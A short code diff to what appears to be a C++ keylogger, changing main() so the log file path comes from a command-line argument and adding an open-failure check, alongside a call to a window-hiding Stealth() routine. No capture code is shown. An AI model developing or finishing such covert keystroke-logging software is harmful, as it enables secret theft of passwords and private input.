@@ -237,12 +237,17 @@ void Stealth()
 #endif
 }
 
-int main()
+int main(int argc, char **argv)
 {
+    std::string output_filename;
+    output_filename = (argc == 2) ? argv[1] : "keylogger.log";
+
     // open output file in append mode
-    const char* output_filename = "keylogger.log";
-    std::cout << "Logging output to " << output_filename << std::endl;
     output_file.open(output_filename, std::ios_base::app);
+    if (output_file.is_open())
+        std::cout << "Logging output to " << output_filename << std::endl;
+    else
+        std::cout << "Failed to create/open the file '" << output_filename << "'\n", exit(1);
 
     // visibility of window
     Stealth();
